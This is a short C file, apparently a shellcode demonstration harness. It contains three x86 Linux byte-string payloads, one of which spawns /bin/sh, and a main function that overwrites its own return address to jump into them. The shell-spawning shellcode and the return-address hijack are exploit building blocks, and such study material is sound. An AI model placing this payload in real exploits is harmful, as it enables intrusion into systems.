// Check if the exit code is 0x31 (49)
char exit_code[] = "\x31\xc0"             // xor    %eax,%eax
    "\xb0\x01"                            // mov    $0x1,%al
    "\x31\xdb"                            // xor    %ebx,%ebx
    "\xb3\x31"                            // mov    $0x31,%bl
    "\xcd\x80";                           // int    $0x80

char print_hello[] = "\xeb\x14"           // jmp    8048076 <_start+0x16>
    "\x31\xc0"                            // xor    %eax,%eax
    "\xb0\x04"                            // mov    $0x4,%al
    "\x31\xdb"                            // xor    %ebx,%ebx
    "\x43"                                // inc    %ebx
    "\x59"                                // pop    %ecx
    "\x31\xd2"                            // xor    %edx,%edx
    "\xb2\x0e"                            // mov    $0xe,%dl
    "\xcd\x80"                            // int    $0x80
    "\x31\xc0"                            // xor    %eax,%eax
    "\xb0\x01"                            // mov    $0x1,%al
    "\xcd\x80"                            // int    $0x80
    "\xe8\xe7\xff\xff\xff"                // call   8048062 <_start+0x2>
    "Hello World!\n";

char spawn_shell[] = "\xeb\x13"           // jmp    8048075 <_start+0x15>
    "\x31\xc0"                            // xor    %eax,%eax
    "\x50"                                // push   %eax
    "\x5a"                                // pop    %edx
    "\x5b"                                // pop    %ebx
    "\x50"                                // push   %eax
    "\x89\xd8"                            // mov    %ebx,%eax
    "\x50"                                // push   %eax
    "\x54"                                // push   %esp
    "\x59"                                // pop    %ecx
    "\x31\xc0"                            // xor    %eax,%eax
    "\xb0\x05"                            // mov    $0x5,%al
    "\x04\x06"                            // add      $0x6,%al
    "\xcd\x80"                            // int    $0x80
    "\xe8\xe8\xff\xff\xff"                // call   8048062 <_start+0x2>
    "/bin/sh";

/**
    Stack:
    ---------------------------------------------------
    | int *ret - | Canary bytes - | EBP -   | RET -   |
    | 4 bytes    | 8 bytes        | 4 bytes | 4 bytes |
    ---------------------------------------------------
**/

int main(int argc, char **argv) {
    int *ret; 
    // ret points to the return address now - 4 words (4 * 4 = 16 bytes)
    ret = (int *)&ret + 4;
    if (argc < 2) {
        printf("Option number required.\n");
        exit(1);
    }
    switch (argv[1][0]) {
        case '1':    
            (*ret) = (int *)exit_code; 
            break;
        case '2':
            (*ret) = (int *)print_hello;
            break;
        default:
            (*ret) = (int *)spawn_shell;
    }
    
    return 0;
}
